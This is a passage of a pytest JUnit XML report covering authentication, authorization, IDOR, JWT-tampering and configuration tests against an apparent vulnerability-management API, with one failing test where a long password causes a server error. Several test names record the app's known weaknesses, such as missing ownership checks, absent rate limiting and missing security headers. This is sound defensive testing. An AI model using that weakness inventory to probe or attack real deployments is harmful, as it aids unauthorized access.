<?xml version="1.0" encoding="utf-8"?><testsuites name="pytest tests"><testsuite name="pytest" errors="0" failures="1" skipped="0" tests="400" time="50.862" timestamp="2026-08-14T10:41:29.207273+00:00" hostname="vm"><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_client_succeeds" time="3.727" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_analyst_succeeds" time="0.305" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_disallowed_roles_rejected[admin]" time="0.030" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_disallowed_roles_rejected[officer]" time="0.033" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_disallowed_roles_rejected[superuser]" time="0.037" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_disallowed_roles_rejected[root]" time="0.032" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_disallowed_roles_rejected[Client]" time="0.031" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_disallowed_roles_rejected[]" time="0.030" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_duplicate_email_rejected" time="0.308" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_missing_required_field_rejected[email]" time="0.035" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_missing_required_field_rejected[password]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_missing_required_field_rejected[full_name]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[plainaddress]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[@missing-local.com]" time="0.028" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[missing-domain@]" time="0.035" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[two..dots@example.com]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[trailing-dot.@example.com]" time="0.031" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[.leading-dot@example.com]" time="0.031" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[spaces in@example.com]" time="0.030" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[double@@at.com]" time="0.037" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[no-at-sign.example.com]" time="0.028" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@]" time="0.028" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@-leadingdash.com]" time="0.028" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@no_tld_here]" time="0.028" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user name@example.com]" time="0.035" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@exam ple.com]" time="0.030" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@[300.300.300.300]]" time="0.030" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@..com]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_malformed_emails_rejected[user@.com]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_looking_emails_accepted[first.last]" time="0.308" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_looking_emails_accepted[user+tag]" time="0.304" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_looking_emails_accepted[user_name]" time="0.302" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_looking_emails_accepted[u]" time="0.303" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_looking_emails_accepted[user123]" time="0.304" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_valid_looking_emails_accepted[a.b.c]" time="0.308" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_password_below_min_length_rejected[]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_password_below_min_length_rejected[a]" time="0.029" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_password_below_min_length_rejected[1234567]" time="0.030" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_password_below_min_length_rejected[short12]" time="0.032" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_password_exactly_min_length_accepted" time="0.315" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_extremely_long_password_does_not_crash" time="0.033"><failure message="AssertionError: Registration 500'd on a long password -- bcrypt likely raised on &gt;72 bytes instead of being truncated consistently before hashing.&#10;assert 500 != 500&#10; +  where 500 = &lt;Response [500 Internal Server Error]&gt;.status_code">self = &lt;test_authentication.TestRegistration object at 0x7fd116c397f0&gt;
client = &lt;httpx.AsyncClient object at 0x7fd11680d4c0&gt;
unique_email = 'qa.a3a832f828ec@vulnara-qa-suite.com'

    async def test_register_extremely_long_password_does_not_crash(self, client, unique_email):
        """
        CATEGORY: Authentication
        TITLE: Registration with a &gt;72-byte password does not 500
        OBJECTIVE: bcrypt hard-caps input at 72 bytes; verify the app truncates
                    consistently instead of raising an uncaught exception.
        EXPECTED: A clean 2xx or 4xx response, never a 500.
        SEVERITY: High
        """
        long_password = "Aa1!" * 50  # 200 bytes, well past bcrypt's 72-byte cap
        r = await client.post("/auth/register", json={
            "email": unique_email, "password": long_password, "full_name": "QA", "role": "client",
        })
&gt;       assert r.status_code != 500, (
            "Registration 500'd on a long password -- bcrypt likely raised on "
            "&gt;72 bytes instead of being truncated consistently before hashing."
        )
E       AssertionError: Registration 500'd on a long password -- bcrypt likely raised on &gt;72 bytes instead of being truncated consistently before hashing.
E       assert 500 != 500
E        +  where 500 = &lt;Response [500 Internal Server Error]&gt;.status_code

tests/test_authentication.py:182: AssertionError</failure></testcase><testcase classname="tests.test_authentication.TestRegistration" name="test_register_role_omitted_defaults_to_client" time="0.304" /><testcase classname="tests.test_authentication.TestRegistration" name="test_register_response_never_leaks_password_hash" time="0.316" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_valid_credentials_returns_tokens" time="0.649" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_wrong_password_rejected" time="0.584" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_nonexistent_account_rejected" time="0.031" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_error_message_does_not_reveal_which_field_was_wrong" time="0.585" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_updates_last_login_at" time="0.590" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_missing_field_rejected[email]" time="0.036" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_missing_field_rejected[password]" time="0.032" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_email_is_case_sensitive_or_normalized_consistently" time="0.312" /><testcase classname="tests.test_authentication.TestLogin" name="test_login_response_never_leaks_password_hash" time="0.584" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_get_me_requires_authentication" time="0.036" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_get_me_returns_the_authenticated_users_own_data" time="0.334" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_refresh_with_valid_token_issues_new_access_token" time="0.590" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_refresh_with_garbage_token_rejected" time="0.040" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_refresh_with_access_token_in_place_of_refresh_token" time="0.585" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_logout_requires_authentication" time="0.030" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_logout_revokes_the_refresh_token" time="0.611" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_invalid_bearer_token_on_protected_route_rejected" time="0.030" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_missing_bearer_prefix_rejected" time="0.031" /><testcase classname="tests.test_authentication.TestMeRefreshLogout" name="test_empty_authorization_header_rejected" time="0.029" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_accessible_to_admin[/admin/config]" time="0.341" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_accessible_to_admin[/admin/cve-definitions]" time="0.036" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_blocked_for_client[/admin/config]" time="0.034" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_blocked_for_client[/admin/cve-definitions]" time="0.035" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_blocked_for_analyst[/admin/config]" time="0.345" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_blocked_for_analyst[/admin/cve-definitions]" time="0.033" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_blocked_when_unauthenticated[/admin/config]" time="0.029" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_endpoint_blocked_when_unauthenticated[/admin/cve-definitions]" time="0.029" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_config_patch_blocked_for_client" time="0.030" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_admin_config_patch_allowed_for_admin" time="0.038" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_cve_sync_blocked_for_analyst" time="0.033" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_create_admin_user_blocked_for_non_admin" time="0.034" /><testcase classname="tests.test_authorization.TestAdminOnlyEndpoints" name="test_create_admin_user_allowed_for_admin" time="0.307" /><testcase classname="tests.test_authorization.TestAnalystPrivilegedActions" name="test_vulnerability_status_update_blocked_for_client" time="0.032" /><testcase classname="tests.test_authorization.TestAnalystPrivilegedActions" name="test_vulnerability_status_update_allowed_for_analyst" time="0.051" /><testcase classname="tests.test_authorization.TestAnalystPrivilegedActions" name="test_remediation_approve_blocked_for_client" time="0.038" /><testcase classname="tests.test_authorization.TestAnalystPrivilegedActions" name="test_remediation_approve_allowed_for_analyst" time="0.041" /><testcase classname="tests.test_authorization.TestAnalystPrivilegedActions" name="test_remediation_reject_blocked_for_client" time="0.032" /><testcase classname="tests.test_authorization.TestAnalystPrivilegedActions" name="test_remediation_reject_allowed_for_admin" time="0.035" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_owner_can_view_own_scan" time="0.092" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_other_client_cannot_view_scan_idor" time="0.338" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_admin_can_view_any_scan" time="0.034" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_unauthenticated_cannot_view_scan" time="0.029" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_other_client_cannot_cancel_scan_idor" time="0.046" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_other_client_cannot_list_scan_vulnerabilities_idor" time="0.034" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_other_client_cannot_list_scan_threat_logs_idor" time="0.034" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_other_client_cannot_list_scan_remediations_idor" time="0.035" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_scan_list_scopes_to_owner_for_client_role" time="0.033" /><testcase classname="tests.test_authorization.TestScanOwnershipCrossTenant" name="test_scan_list_shows_all_scans_for_admin" time="0.041" /><testcase classname="tests.test_authorization.TestKnownIdorGaps" name="test_get_vulnerability_by_id_has_no_ownership_check" time="0.033" /><testcase classname="tests.test_authorization.TestKnownIdorGaps" name="test_get_remediation_by_id_has_no_ownership_check" time="0.032" /><testcase classname="tests.test_authorization.TestKnownIdorGaps" name="test_list_remediations_is_not_scoped_per_tenant" time="0.033" /><testcase classname="tests.test_authorization.TestDeviceRegistrationAuthz" name="test_device_register_requires_auth" time="0.029" /><testcase classname="tests.test_authorization.TestDeviceRegistrationAuthz" name="test_device_register_succeeds_for_any_authenticated_role" time="0.043" /><testcase classname="tests.test_authorization.TestDeviceRegistrationAuthz" name="test_device_register_succeeds_for_analyst_role" time="0.035" /><testcase classname="tests.test_authorization.TestDeviceRegistrationAuthz" name="test_device_register_succeeds_for_admin_role" time="0.035" /><testcase classname="tests.test_authorization.TestAuthorizationHeaderEdgeCases" name="test_analyst_cannot_reach_admin_config_patch" time="0.031" /><testcase classname="tests.test_authorization.TestAuthorizationHeaderEdgeCases" name="test_cve_sync_blocked_for_client" time="0.031" /><testcase classname="tests.test_authorization.TestAuthorizationHeaderEdgeCases" name="test_cve_definitions_get_blocked_for_client" time="0.041" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_new_remediation_starts_pending" time="0.035" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_approve_sets_status_and_reviewer" time="0.035" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_mark_executed_requires_prior_approval" time="0.032" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_mark_executed_succeeds_after_approval" time="0.042" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_mark_executed_has_no_role_restriction" time="0.048" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_reject_after_approve_silently_overwrites_state" time="0.042" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_get_remediation_not_found_returns_404" time="0.031" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_approve_nonexistent_remediation_returns_404" time="0.032" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_list_remediations_status_filter_is_case_insensitive" time="0.045" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_create_remediation_for_nonexistent_vulnerability_returns_404" time="0.034" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_create_remediation_has_no_ownership_or_role_restriction" time="0.099" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_create_remediation_accepts_optional_target_os" time="0.040" /><testcase classname="tests.test_business_logic.TestRemediationLifecycle" name="test_remediation_technical_script_field_is_never_empty_for_seeded_data" time="0.033" /><testcase classname="tests.test_business_logic.TestScanCancellationSemantics" name="test_cancelling_a_pending_scan_succeeds" time="0.056" /><testcase classname="tests.test_business_logic.TestScanCancellationSemantics" name="test_cancelling_an_already_terminal_scan_is_a_harmless_noop" time="0.052" /><testcase classname="tests.test_business_logic.TestScanCancellationSemantics" name="test_cancel_nonexistent_scan_returns_404" time="0.032" /><testcase classname="tests.test_business_logic.TestScanCancellationSemantics" name="test_new_scan_always_starts_pending" time="0.035" /><testcase classname="tests.test_business_logic.TestScanCancellationSemantics" name="test_active_testing_enabled_true_is_honored_as_opt_in" time="0.049" /><testcase classname="tests.test_business_logic.TestAccountAndTokenBusinessRules" name="test_two_users_can_register_with_different_case_full_names" time="0.590" /><testcase classname="tests.test_business_logic.TestAccountAndTokenBusinessRules" name="test_expires_in_is_a_sane_positive_number" time="0.026" /><testcase classname="tests.test_business_logic.TestAccountAndTokenBusinessRules" name="test_admin_provisioned_user_can_log_in_with_temp_password" time="0.595" /><testcase classname="tests.test_business_logic.TestAccountAndTokenBusinessRules" name="test_scan_list_response_excludes_other_tenants_scans_count" time="0.050" /><testcase classname="tests.test_business_logic.TestAccountAndTokenBusinessRules" name="test_remediation_reviewed_by_matches_the_acting_users_id" time="0.047" /><testcase classname="tests.test_business_logic.TestAccountAndTokenBusinessRules" name="test_multiple_remediations_can_exist_for_the_same_vulnerability" time="0.036" /><testcase classname="tests.test_configuration.TestCorsConfiguration" name="test_allowed_origin_is_reflected_in_preflight" time="0.028" /><testcase classname="tests.test_configuration.TestCorsConfiguration" name="test_arbitrary_untrusted_origin_is_not_reflected" time="0.029" /><testcase classname="tests.test_configuration.TestCorsConfiguration" name="test_credentials_allowed_only_for_trusted_origin" time="0.028" /><testcase classname="tests.test_configuration.TestCorsConfiguration" name="test_preflight_allows_all_http_methods" time="0.035" /><testcase classname="tests.test_configuration.TestCorsConfiguration" name="test_preflight_allows_all_request_headers" time="0.029" /><testcase classname="tests.test_configuration.TestMissingSecurityHeaders" name="test_no_x_content_type_options_header" time="0.030" /><testcase classname="tests.test_configuration.TestMissingSecurityHeaders" name="test_no_x_frame_options_header" time="0.030" /><testcase classname="tests.test_configuration.TestMissingSecurityHeaders" name="test_no_strict_transport_security_header" time="0.030" /><testcase classname="tests.test_configuration.TestMissingSecurityHeaders" name="test_no_content_security_policy_header" time="0.037" /><testcase classname="tests.test_configuration.TestMissingSecurityHeaders" name="test_server_banner_discloses_uvicorn" time="0.032" /><testcase classname="tests.test_configuration.TestErrorResponseDisclosure" name="test_404_response_does_not_leak_internal_paths" time="0.029" /><testcase classname="tests.test_configuration.TestErrorResponseDisclosure" name="test_validation_error_does_not_leak_stack_trace" time="0.033" /><testcase classname="tests.test_configuration.TestErrorResponseDisclosure" name="test_crash_inducing_request_does_not_leak_stack_trace" time="0.033" /><testcase classname="tests.test_configuration.TestRateLimiting" name="test_no_http_layer_rate_limiting_on_login" time="4.435" /><testcase classname="tests.test_configuration.TestRateLimiting" name="test_no_http_layer_rate_limiting_on_register" time="2.832" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_health_endpoint_is_publicly_accessible_by_design" time="0.030" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_health_endpoint_reports_db_connectivity" time="0.030" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_root_path_does_not_500" time="0.028" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_options_wildcard_method_not_allowed_leaks_no_internals" time="0.035" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_admin_config_get_response_shape" time="0.031" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_multiple_concurrent_health_checks_all_succeed" time="0.046" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_trailing_slash_on_collection_route_handled_consistently" time="0.033" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_case_sensitivity_of_route_paths" time="0.029" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_query_string_on_a_route_without_defined_params_is_ignored" time="0.032" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_scan_vulnerabilities_severity_filter_accepts_arbitrary_strings[not_a_severity]" time="0.033" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_scan_vulnerabilities_severity_filter_accepts_arbitrary_strings[\U0001f525]" time="0.032" /><testcase classname="tests.test_configuration.TestHealthAndMiscConfig" name="test_scan_vulnerabilities_severity_filter_accepts_arbitrary_strings[1234]" time="0.039" /><testcase classname="tests.test_dast.TestAuthBypassAttempts" name="test_scan_creation_without_any_auth_header_rejected" time="0.028" /><testcase classname="tests.test_dast.TestAuthBypassAttempts" name="test_x_forwarded_for_header_does_not_grant_trust" time="0.028" /><testcase classname="tests.test_dast.TestAuthBypassAttempts" name="test_x_admin_style_headers_do_not_grant_privilege" time="0.030" /><testcase classname="tests.test_dast.TestAuthBypassAttempts" name="test_role_claim_cannot_be_supplied_via_request_body" time="0.033" /><testcase classname="tests.test_dast.TestAuthBypassAttempts" name="test_user_id_in_body_cannot_reassign_scan_ownership" time="0.060" /><testcase classname="tests.test_dast.TestJwtTampering" name="test_expired_style_forged_token_rejected" time="0.030" /><testcase classname="tests.test_dast.TestJwtTampering" name="test_token_signed_with_guessed_weak_secret_rejected" time="0.060" /><testcase classname="tests.test_dast.TestJwtTampering" name="test_token_for_deleted_or_nonexistent_user_rejected" time="0.031" /><testcase classname="tests.test_dast.TestJwtTampering" name="test_algorithm_confusion_hs256_to_rs256_style_token_rejected" time="0.029" /><testcase classname="tests.test_dast.TestJwtTampering" name="test_truncated_token_rejected" time="0.033" /><testcase classname="tests.test_dast.TestJwtTampering" name="test_token_with_extra_trailing_characters_rejected" time="0.032" /><testcase classname="tests.test_dast.TestHttpMethodAndVerbTampering" name="test_unsupported_methods_on_scans_collection_rejected_cleanly[PUT]" time="0.029" /><testcase classname="tests.test_dast.TestHttpMethodAndVerbTampering" name="test_unsupported_methods_on_scans_collection_rejected_cleanly[DELETE]" time="0.029" /><testcase classname="tests.test_dast.TestHttpMethodAndVerbTampering" name="test_unsupported_methods_on_scans_collection_rejected_cleanly[PATCH]" time="0.029" /><testcase classname="tests.test_dast.TestHttpMethodAndVerbTampering" name="test_head_request_on_health_does_not_error" time="0.037" /><testcase classname="tests.test_dast.TestBruteForceAndEnumeration" name="test_repeated_failed_logins_do_not_lock_or_crash_account" time="6.066" /><testcase classname="tests.test_dast.TestBruteForceAndEnumeration" name="test_registration_does_not_reveal_which_emails_already_exist_via_timing_hint" time="0.308" /><testcase classname="tests.test_dast.TestCrossTenantWriteAttempts" name="test_client2_cannot_patch_client1_vulnerability_status" time="0.030" /><testcase classname="tests.test_dast.TestCrossTenantWriteAttempts" name="test_admin_created_analyst_cannot_reach_admin_only_routes" time="0.584" /><testcase classname="tests.test_dast.TestSessionInvalidationDast" name="test_old_access_token_still_works_after_password_is_effectively_unchanged" time="0.583" /><testcase classname="tests.test_dast.TestSessionInvalidationDast" name="test_logged_out_refresh_token_cannot_be_reused_for_new_access_tokens" time="0.595" /><testcase classname="tests.test_dast.TestAdditionalIdorProbes" name="test_client2_cannot_cancel_client1_scan_even_with_valid_own_token" time="0.037" /><testcase classname="tests.test_dast.TestAdditionalIdorProbes" name="test_client2_cannot_read_client1_vulnerabilities_list" time="0.032" /><testcase classname="tests.test_dast.TestAdditionalIdorProbes" name="test_sequential_scan_ids_do_not_allow_enumeration" time="0.027" /><testcase classname="tests.test_dast.TestAdditionalIdorProbes" name="test_probing_ten_random_uuids_for_scans_all_return_404" time="0.062" /><testcase classname="tests.test_dast.TestContentTypeAndBodyTampering" name="test_malformed_json_body_returns_422_not_500" time="0.031" /><testcase classname="tests.test_dast.TestContentTypeAndBodyTampering" name="test_wrong_content_type_on_json_endpoint_handled_cleanly" time="0.032" /><testcase classname="tests.test_dast.TestContentTypeAndBodyTampering" name="test_array_instead_of_object_body_returns_422" time="0.031" /><testcase classname="tests.test_dast.TestContentTypeAndBodyTampering" name="test_deeply_nested_json_does_not_crash_the_server" time="0.034" /><testcase classname="tests.test_functional_api.TestHealthEndpoint" name="test_health_status_code" time="0.041" /><testcase classname="tests.test_functional_api.TestHealthEndpoint" name="test_health_response_has_status_field" time="0.030" /><testcase classname="tests.test_functional_api.TestHealthEndpoint" name="test_health_response_has_db_field" time="0.030" /><testcase classname="tests.test_functional_api.TestAuthResponseShapes" name="test_register_response_has_all_expected_fields" time="0.303" /><testcase classname="tests.test_functional_api.TestAuthResponseShapes" name="test_login_response_has_all_expected_fields" time="0.582" /><testcase classname="tests.test_functional_api.TestAuthResponseShapes" name="test_me_response_matches_user_response_contract" time="0.046" /><testcase classname="tests.test_functional_api.TestAuthResponseShapes" name="test_me_role_reflects_actual_account_role" time="0.035" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_create_scan_response_shape" time="0.036" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_get_scan_includes_vulnerability_severity_counts" time="0.038" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_list_scans_returns_an_array" time="0.032" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_get_nonexistent_scan_returns_404" time="0.040" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_list_scan_vulnerabilities_returns_array" time="0.034" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_list_scan_vulnerabilities_severity_filter_accepted" time="0.032" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_list_scan_threat_logs_returns_array_for_owner" time="0.033" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_list_scan_remediations_returns_array_for_owner" time="0.034" /><testcase classname="tests.test_functional_api.TestScanCrud" name="test_scan_created_at_is_iso8601" time="0.045" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_get_vulnerability_response_shape" time="0.038" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_get_nonexistent_vulnerability_returns_404" time="0.032" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_update_nonexistent_vulnerability_returns_404" time="0.032" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_update_vulnerability_status_round_trips[CONFIRMED]" time="0.037" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_update_vulnerability_status_round_trips[FALSE_POSITIVE]" time="0.048" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_update_vulnerability_status_round_trips[REMEDIATED]" time="0.038" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_update_vulnerability_status_round_trips[OPEN]" time="0.038" /><testcase classname="tests.test_functional_api.TestVulnerabilityCrud" name="test_vulnerability_cvss_score_is_numeric" time="0.032" /><testcase classname="tests.test_functional_api.TestRemediationCrud" name="test_list_remediations_returns_array" time="0.038" /><testcase classname="tests.test_functional_api.TestRemediationCrud" name="test_remediation_response_shape" time="0.032" /><testcase classname="tests.test_functional_api.TestRemediationCrud" name="test_remediation_ai_confidence_is_numeric_between_0_and_1" time="0.032" /><testcase classname="tests.test_functional_api.TestRemediationCrud" name="test_reject_nonexistent_remediation_returns_404" time="0.034" /><testcase classname="tests.test_functional_api.TestRemediationCrud" name="test_mark_executed_nonexistent_remediation_returns_404" time="0.034" /><testcase classname="tests.test_functional_api.TestDeviceCrud" name="test_register_device_response_shape" time="0.046" /><testcase classname="tests.test_functional_api.TestDeviceCrud" name="test_register_same_device_token_twice_does_not_500" time="0.043" /><testcase classname="tests.test_functional_api.TestAdminConfigCrud" name="test_list_config_returns_array_of_key_value_entries" time="0.031" /><testcase classname="tests.test_functional_api.TestAdminConfigCrud" name="test_patch_config_response_echoes_key_and_value" time="0.032" /><testcase classname="tests.test_functional_api.TestAdminConfigCrud" name="test_patch_config_change_is_not_actually_persisted" time="0.046" /><testcase classname="tests.test_functional_api.TestAdminConfigCrud" name="test_patch_config_accepts_unknown_key_without_error" time="0.033" /><testcase classname="tests.test_functional_api.TestAdminConfigCrud" name="test_list_cve_definitions_returns_array" time="0.033" /><testcase classname="tests.test_functional_api.TestAdminConfigCrud" name="test_sync_cve_definitions_response_shape" time="0.031" /><testcase classname="tests.test_functional_api.TestErrorEnvelopeConsistency" name="test_404_responses_share_a_consistent_detail_field[/scans/00000000-0000-0000-0000-000000000000-GET]" time="0.035" /><testcase classname="tests.test_functional_api.TestErrorEnvelopeConsistency" name="test_404_responses_share_a_consistent_detail_field[/vulnerabilities/00000000-0000-0000-0000-000000000000-GET]" time="0.038" /><testcase classname="tests.test_functional_api.TestErrorEnvelopeConsistency" name="test_404_responses_share_a_consistent_detail_field[/remediations/00000000-0000-0000-0000-000000000000-GET]" time="0.033" /><testcase classname="tests.test_functional_api.TestErrorEnvelopeConsistency" name="test_401_responses_share_a_consistent_detail_field[/admin/config]" time="0.030" /><testcase classname="tests.test_functional_api.TestErrorEnvelopeConsistency" name="test_401_responses_share_a_consistent_detail_field[/scans]" time="0.029" /><testcase classname="tests.test_functional_api.TestErrorEnvelopeConsistency" name="test_401_responses_share_a_consistent_detail_field[/remediations]" time="0.030" /><testcase classname="tests.test_functional_api.TestAdminCreateUserCrud" name="test_admin_can_provision_any_role[client]" time="0.312" /><testcase classname="tests.test_functional_api.TestAdminCreateUserCrud" name="test_admin_can_provision_any_role[analyst]" time="0.310" /><testcase classname="tests.test_functional_api.TestAdminCreateUserCrud" name="test_admin_can_provision_any_role[admin]" time="0.307" /><testcase classname="tests.test_functional_api.TestAdminCreateUserCrud" name="test_admin_create_user_response_has_no_password_fields" time="0.305" /><testcase classname="tests.test_functional_api.TestAdminCreateUserCrud" name="test_admin_create_user_duplicate_email_rejected" time="0.311" /><testcase classname="tests.test_functional_api.TestRefreshLogoutCrud" name="test_refresh_response_shape" time="0.590" /><testcase classname="tests.test_functional_api.TestRefreshLogoutCrud" name="test_logout_returns_204_no_content" time="0.585" /><testcase classname="tests.test_functional_api.TestScanListOrderingAndContent" name="test_newly_created_scan_appears_in_list" time="0.041" /><testcase classname="tests.test_functional_api.TestScanListOrderingAndContent" name="test_each_scan_list_entry_has_required_fields" time="0.033" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_scan_create_response_field_types[scan_id-str]" time="0.041" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_scan_create_response_field_types[target-str]" time="0.040" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_scan_create_response_field_types[status-str]" time="0.039" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_scan_create_response_field_types[active_testing_enabled-bool]" time="0.040" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_user_response_field_types[user_id-str]" time="0.309" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_user_response_field_types[email-str]" time="0.313" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_user_response_field_types[full_name-str]" time="0.305" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_user_response_field_types[role-str]" time="0.304" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_write_endpoints_return_json_content_type[/scans-POST]" time="0.032" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_write_endpoints_return_json_content_type[/auth/register-POST]" time="0.030" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" 